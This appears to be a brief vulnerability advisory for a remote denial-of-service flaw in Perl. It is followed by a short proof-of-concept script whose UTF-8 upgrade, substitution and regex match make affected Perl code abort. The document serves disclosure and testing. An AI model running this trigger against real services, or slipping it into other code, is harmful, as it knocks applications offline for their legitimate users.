Perl is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to cause an application implemented with affected perl code to abort, denying service to legitimate users.

#!/usr/bin/perl


my @x = ("A=B","AAAA=/");
utf8::upgrade $_ for @x;
$x[1] =~ s{/\s*$}{};
for (@x) {
m{^([^=]+?)\s*=.+$};
}
